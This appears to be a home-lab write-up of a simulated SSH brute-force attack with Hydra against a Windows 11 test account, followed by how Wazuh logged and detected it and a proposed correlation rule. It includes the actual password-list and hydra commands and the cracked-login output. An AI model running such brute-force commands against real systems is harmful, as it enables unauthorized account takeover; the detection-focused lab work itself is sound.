# 02 · SSH Brute Force with Hydra

## Objective

Simulate a credential brute-force attack against the victim's SSH service and confirm Wazuh detects the resulting pattern of failed/successful authentications.

## Environment

- Wazuh 4.14.10 on Ubuntu Server 24.04 ARM64 (`192.168.154.10`)
- Windows 11 ARM victim (`192.168.154.20`) with OpenSSH Server, Sysmon, Wazuh agent
- Kali Linux ARM64 attacker (`192.168.154.132`), tool: Hydra v9.7

## A detour before the attack: RDP, then Microsoft accounts, then a dedicated test account

The lab's original plan targeted RDP for this exercise. Windows 11 **Home** doesn't accept inbound RDP connections at all — that server role only exists on Pro/Enterprise/Education — so I substituted SSH (OpenSSH Server) as the target service instead. Same MITRE technique, same detection intent, no edition upgrade required.

The next problem surfaced while picking a target account: the victim machine's primary account is a Microsoft Account (PIN-based sign-in). OpenSSH on Windows authenticates through the Win32 `LogonUser` API, which **does not support Microsoft/cloud account credentials** — only local or Active Directory accounts. No password would ever succeed against that account over SSH, regardless of how strong or weak it was; the login mechanism itself is incompatible, by design.

Rather than find a workaround (or worse, use my real Microsoft account password in an attack simulation — a bad practice on principle, isolated lab or not), I created a dedicated **local** account purely for this exercise:

```
net user labvictim <test-password> /add
```

This mirrors how a real engagement should separate test credentials from production ones.

## Attack

```
cat > ~/lista-corta.txt <<'EOF'
123456
password
admin
qwerty
<test-password>
kali123
labvictim
EOF

hydra -l labvictim -P ~/lista-corta.txt ssh://192.168.154.20
```

Run: 2026-11-13, 15:03:55–56 UTC.

## Evidence

```
[22][ssh] host: 192.168.154.20   login: labvictim   password: <test-password>
1 of 1 target successfully completed, 1 valid password found
```

Found in ~1 second, 7 password attempts.

In Wazuh's Threat Hunting view, filtering by agent and the attack window shows a tight, repeating cluster of events at millisecond intervals:

| Time (UTC) | Rule | Description | Level |
|---|---|---|---|
| 15:03:58.883 | 60106 | Windows Logon Success | 3 |
| 15:03:58.898 | 60137 | Windows User Logoff | 3 |
| 15:03:58.915 | 60122 | Logon Failure — Unknown user or bad password | 5 |
| 15:03:58.967 | 60106 | Windows Logon Success | 3 |
| 15:03:58.982 | 60137 | Windows User Logoff | 3 |
| 15:03:58.999 | 67023 | Non service account logged off | 3 |
| 15:03:59.019 | 60122 | Logon Failure — Unknown user or bad password | 5 |
| 15:03:59.068 | 60106 | Windows Logon Success | 3 |
| 15:03:59.084 | 60137 | Windows User Logoff | 3 |
| 15:03:59.100 | 67023 | Non service account logged off | 3 |
| 15:03:59.117 | 60122 | Logon Failure — Unknown user or bad password | 5 |
| 15:03:59.134 | 67023 | Non service account logged off | 3 |
| 15:03:59.185 | 67023 | Non service account logged off | 3 |

(Total window: 2,339 events across the session; this table is a representative slice.)

## Analysis

Windows doesn't have a dedicated Wazuh rule for SSH authentication specifically — I never configured the agent to read OpenSSH's own server log — but it didn't need one. Every authentication attempt against the box, SSH included, still goes through the Windows security subsystem and gets logged as a standard Windows Security event (logon success/failure, logoff). Detection worked without any SSH-specific configuration.

The alternating success/failure pattern directly reflects Hydra's behavior: each password in the list is tried in sequence, each attempt opens and closes a session, and the final line is the one that actually succeeds. A human analyst looking at this cluster — 13+ logon/logoff cycles for the same account within roughly 300 milliseconds — would immediately recognize automated brute-forcing; no single human could type a password, get rejected, and retry that fast.

## MITRE ATT&CK

`T1110` · Brute Force

## Detection improvement

The individual `Logon Failure` events (rule 60122, level 5) are informative but not alarming on their own — a user mistyping their password a couple of times is normal. The real signal is *volume within a short window for one account/source*. A dedicated correlation rule — N `60122` events for the same `agent.id` and target account within, say, 10 seconds — would turn this from "a sequence of individually low-severity events" into one clear, higher-severity brute-force alert, which is both easier to triage and harder to miss in a noisy environment.

Separately, I'd add a `<localfile>` entry reading the OpenSSH server's own log (`C:\ProgramData\ssh\logs\`, once enabled) to the agent config, so an analyst gets the actual SSH-level detail — source port, client version string — instead of only the generic Windows logon event.

## Lessons

- A PIN and a Microsoft Account password are not the same credential as a local Windows account password, and remote authentication protocols (SSH included) generally can't use either against a cloud-backed account. That's a configuration fact worth knowing before assuming "I'll just brute-force my own login."
- Never reuse a real personal password in an attack simulation, even an isolated one — a dedicated, disposable test account removes the risk entirely and is the more professional habit anyway.
- A missing *dedicated* log source (SSH's own log, here) doesn't always mean a missing *detection* — the underlying OS security event log often already carries the signal.
